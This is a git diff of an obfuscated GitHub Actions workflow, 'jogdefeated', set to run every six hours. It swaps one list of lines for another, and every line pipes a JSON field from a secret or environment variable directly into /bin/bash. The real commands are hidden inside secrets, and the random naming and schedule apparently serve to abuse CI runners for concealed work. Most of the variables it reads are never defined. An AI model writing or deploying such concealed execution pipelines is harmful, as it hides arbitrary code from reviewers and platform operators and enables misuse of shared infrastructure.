@@ -3,29 +3,20 @@ name: jogdefeated
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
-
-jobs:  # 7657
+    - cron: '8 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jogdefeated
         env:
-          o6: ${{ secrets.o6 }}
+          cx2346: ${{ secrets.cx2346 }}
         run: |
-          echo $o6 | jq -r .z0338 | /bin/bash
-          echo $ls194 | jq -r .f940 | /bin/bash
-          echo $g0631 | jq -r .x8 | /bin/bash
-          echo $val6253 | jq -r .z2102 | /bin/bash
-          echo $ch5 | jq -r .osgn825 | /bin/bash
-          echo $mjwo6621 | jq -r .uj85065 | /bin/bash
-          echo $ddl25403 | jq -r .byca1611 | /bin/bash
-          echo $gao94 | jq -r .a35 | /bin/bash
-          echo $pm611 | jq -r .nlxlc6743 | /bin/bash
-          echo $yo04054 | jq -r .gw573 | /bin/bash
-          echo $ah672 | jq -r .gvfhv57 | /bin/bash
-          echo $fvw8 | jq -r .pc62725 | /bin/bash
-          echo $hlei5 | jq -r .uh52 | /bin/bash
+          echo $cx2346 | jq -r .bc5 | /bin/bash
+          echo $tting02827 | jq -r .ircqr63 | /bin/bash
+          echo $rp5 | jq -r .jaft958 | /bin/bash
+          echo $ckoqb1 | jq -r .smi28 | /bin/bash
+          echo $cssym16689 | jq -r .jwfe77737 | /bin/bash
+          echo $ybwf900 | jq -r .vx50765 | /bin/bash
 
